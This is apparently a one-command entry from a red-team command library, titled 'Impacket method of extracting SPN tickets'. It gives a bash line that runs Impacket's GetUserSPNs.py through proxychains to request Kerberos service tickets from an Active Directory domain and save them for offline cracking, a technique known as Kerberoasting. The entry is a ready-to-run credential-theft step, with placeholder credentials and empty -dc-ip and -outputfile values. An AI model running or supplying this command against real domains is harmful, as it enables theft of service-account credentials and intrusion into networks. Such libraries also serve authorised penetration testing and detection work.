---
id: 2dcc4cbf-362a-4e2e-b11e-154b9d78c915
name: Impacket method of extracting SPN tickets
type: command
executor: bash
data: 'proxychains python ./GetUserSPNs.py -request domain.com/domainuser:password
  -dc-ip -outputfile

  '
output: null
created_at: '2020-07-14T18:21:07.838038+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Impacket method of extracting SPN tickets

```bash
proxychains python ./GetUserSPNs.py -request domain.com/domainuser:password -dc-ip -outputfile

```
